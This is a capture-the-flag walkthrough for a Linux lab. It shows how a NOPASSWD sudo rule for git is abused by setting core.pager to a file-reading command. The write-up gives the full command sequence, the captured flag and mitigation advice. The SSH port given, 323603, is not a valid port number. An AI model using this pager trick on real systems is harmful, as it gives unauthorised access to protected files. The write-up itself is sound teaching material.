---
title: Privilege Escalation Lab1 - Linux Git Pager Abuse
date: 2026-07-30 12:00:00 +0000
categories: [Walkthroughs, Linux Escalation]
tags: [linux-privesc, sudo-abuse, git, Linux Escalation, pt-garage]

image:
    path: /assets/img/custom_banners/2026-07-30-privilege-escalation-lab1_banner.png
---

- **Box:** Privilege Escalation Lab1
- **Vulnerability:** Sudo Abuse via Git `core.pager` misconfiguration
- **Flag:** `ctf{esc4l4t!ng_pr!v!l3g3s}`

---

## 1. Initial Recon

We are provided with a downloadable ZIP file (`privilege_escalation_1.zip`). 

Unzipping it yields an SSH private key (`id_ecdsa`) and a username (`username.txt` containing the username `user`):

```bash
unzip privilege_escalation_1.zip 
# Inflating: id_ecdsa
# Extracting: username.txt
```

![Unzip Output](/assets/img/ptgarage/privilege_escalation_lab1/img_2_1.png)

We use these credentials to SSH into the target:

```bash
ssh -i id_ecdsa user@172.31.13.45 -p 323603
```

## 2. Privilege Escalation Vector

Once logged in, we check the directories and find the `/home/ctf` user directory. However, we do not have permission to read the flag inside it:

```bash
ls -la /home/ctf
cat /home/ctf/flag
# cat: /home/ctf/flag: Permission denied
```

Checking our sudo privileges:
```bash
sudo -l
```

**Output:**
```text
Matching Defaults entries for user on ctf-rahulshashidhar-...:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on ctf-rahulshashidhar-...:
    (ctf : ctf) NOPASSWD: /usr/bin/git
```

## 3. Exploitation

The system allows our low-privileged `user` to run `/usr/bin/git` as the `ctf` account without entering a password. 

Because `git` allows users to define custom programs to view long text files via the `core.pager` setting, this specific privilege rule can be abused to execute commands outside of Git's intended behavior.

By modifying the `ctf` user's global configuration, the `core.pager` utility is swapped from a standard text viewer to a file-reading command (`cat /home/ctf/flag`). When the `-p` (paginate) flag is used to force Git to look at its configuration list, Git executes that custom `cat` command under the security context of the `ctf` account, successfully bypassing the file permissions and printing the flag.

```bash
# Set the global git pager to cat the flag file
sudo -u ctf git config --global core.pager 'cat /home/ctf/flag'

# Trigger the pager by listing the config with pagination forced
sudo -u ctf git -p config --list
```

![Flag Execution](/assets/img/ptgarage/privilege_escalation_lab1/img_4_1.png)

This successfully triggers the payload and prints the flag:
```text
ctf{esc4l4t!ng_pr!v!l3g3s}
```

## 4. Mitigation
- Never grant `NOPASSWD` sudo access to large binaries like `git` that have extensive subcommands, configuration options, or pagination features.
- If necessary to run specific git commands as another user, wrap them in a bash script and restrict sudo access exclusively to that script.
